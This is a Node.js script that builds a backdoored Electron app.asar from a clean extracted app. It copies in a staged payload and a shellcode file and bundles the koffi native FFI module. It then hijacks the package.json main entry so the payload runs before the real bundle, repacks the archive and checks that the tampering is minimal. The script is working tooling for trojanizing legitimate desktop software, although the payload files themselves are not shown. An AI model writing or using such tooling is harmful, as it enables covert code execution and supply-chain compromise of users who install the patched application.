#!/usr/bin/env node
// tools/patch.js — build a backdoored app.asar from the extracted tree.
//
// Usage: node tools/patch.js <clean-extracted-dir> <original.asar> <output.asar>
//
// What it does:
//   1. copies the clean extracted tree to .build/
//   2. drops payload/stage.js into it
//   3. repoints package.json "main"  bundle.js -> stage.js
//      (stage.js chains back to bundle.js at the end)
//   4. repacks the archive with @electron/asar; by default koffi's .node is
//      packed too, and Electron extracts it to %TEMP% on first require
//   5. validates the result against the original (file-list diff + hashes)
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const asar = require('@electron/asar');

const [, , srcDir, origAsar, outAsar] = process.argv;
if (!srcDir || !origAsar || !outAsar) {
  console.error('usage: node tools/patch.js <clean-extracted-dir> <original.asar> <output.asar>');
  process.exit(1);
}

const buildDir = path.join(__dirname, '..', '.build');
const sha256 = (f) => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex');
const rm = (p) => fs.rmSync(p, { recursive: true, force: true });

// Electron can load a packed native module: its process.dlopen override copies
// the .node to a temporary file first. Set KOFFI_UNPACK=1 to ship the .node in
// app.asar.unpacked instead, avoiding that runtime extraction.
const unpackNative = process.env.KOFFI_UNPACK === '1';

// 1-2. fresh copy of the clean tree + drop the stage-2 module
rm(buildDir);
fs.cpSync(srcDir, buildDir, { recursive: true });

// 2b. vendor the FFI module: JS stays in the asar, the .node goes to .unpacked
const rootNM  = path.join(__dirname, '..', 'node_modules');
const buildNM = path.join(buildDir, 'node_modules');
fs.mkdirSync(path.join(buildNM, '@koromix'), { recursive: true });

const deps = ['koffi', '@koromix/koffi-win32-x64'];
for (const dep of deps) {
  const from = path.join(rootNM, dep);
  if (!fs.existsSync(from)) {
    console.error(`missing ${dep} — install koffi and the matching Windows prebuild`);
    process.exit(1);
  }
  fs.cpSync(from, path.join(buildNM, dep), { recursive: true });
}

// koffi refuses to load when the JS wrapper and native binary versions differ.
const versionOf = (dep) =>
  JSON.parse(fs.readFileSync(path.join(rootNM, dep, 'package.json'), 'utf8')).version;
const [koffiVersion, nativeVersion] = deps.map(versionOf);
if (koffiVersion !== nativeVersion) {
  console.error(`koffi version mismatch: JS ${koffiVersion} vs native ${nativeVersion}`);
  process.exit(1);
}

fs.copyFileSync(path.join(__dirname, '..', 'payload', 'stage.js'),
                path.join(buildDir, 'stage.js'));
fs.copyFileSync(path.join(__dirname, '..', 'payload', 'shellcode.js'),
                path.join(buildDir, 'shellcode.js'));

// 3. hijack the by-design loading surface: the package.json "main" entry
const pkgPath = path.join(buildDir, 'package.json');
const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
const origMain = pkg.main;
if (pkg.main !== 'bundle.js') {
  console.warn(`! unexpected main entry: ${pkg.main} — patching anyway`);
}
pkg.main = 'stage.js';
fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 4));

// 4. repack (async API). Packed mode keeps everything in app.asar; Electron
// extracts the .node to %TEMP% when require() first loads it.
(async () => {
  rm(`${outAsar}.unpacked`); // drop binaries left by an older packing mode
  if (unpackNative) {
    await asar.createPackageWithOptions(buildDir, outAsar, {
      unpackDir: 'node_modules/@koromix',
    });
  } else {
    await asar.createPackage(buildDir, outAsar);
  }

  // 5. validate: packed file list must differ from original by exactly
  // stage.js; node_modules is expected and mostly lives unpacked.
  const before = new Set(asar.listPackage(origAsar));
  const after = new Set(asar.listPackage(outAsar));
  const added = [...after].filter((f) =>
    !before.has(f) &&
    f !== '/node_modules' &&
    !f.startsWith('/node_modules/')
  );
  const removed = [...before].filter((f) => !after.has(f));

  // extractFile works for both packed and unpacked entries, so this proves
  // the native module is present in either delivery mode.
  const nativeEntry = 'node_modules/@koromix/koffi-win32-x64/win32_x64/koffi.node';
  const nativeSource = path.join(rootNM, '@koromix', 'koffi-win32-x64', 'win32_x64', 'koffi.node');
  let nativeBytes;
  try {
    nativeBytes = asar.extractFile(outAsar, nativeEntry);
  } catch {
    console.error(`! native koffi module missing from archive: ${nativeEntry}`);
    process.exit(1);
  }
  if (crypto.createHash('sha256').update(nativeBytes).digest('hex') !== sha256(nativeSource)) {
    console.error('! native koffi module hash mismatch after pack');
    process.exit(1);
  }

  const injectedMain = asar.extractFile(outAsar, 'package.json').toString();
  const injectedPayload = asar.extractFile(outAsar, 'stage.js').toString();

  console.log(`original : ${origAsar}  sha256 ${sha256(origAsar).slice(0, 16)}…`);
  console.log(`patched  : ${outAsar}  sha256 ${sha256(outAsar).slice(0, 16)}…`);
  console.log(`main     : ${origMain} -> stage.js`);
  console.log(`added    : ${added.join(', ') || '(none)'}`);
  console.log(`removed  : ${removed.join(', ') || '(none)'}`);
  console.log(`native   : ${nativeEntry} (${unpackNative ? 'app.asar.unpacked' : 'packed in app.asar'})`);
  console.log(`sanity   : packed main entry = ${JSON.parse(injectedMain).main}, payload ${injectedPayload.length} bytes`);
})();
